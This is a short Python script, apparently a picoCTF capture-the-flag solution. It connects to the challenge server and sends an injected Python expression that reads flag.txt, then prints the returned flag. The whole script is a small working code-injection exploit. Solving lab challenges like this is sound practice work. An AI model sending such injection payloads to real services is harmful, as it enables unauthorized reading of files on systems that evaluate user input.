import socket

address = 'saturn.picoctf.net'
port = 50536

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((address, port))

s.recv(1024)

payload = "print(open('flag.txt', 'r').read())\n"
s.send(payload.encode())

flag = s.recv(1024).decode()[:58]
print(f'THE FLAG IS {flag}!!!!')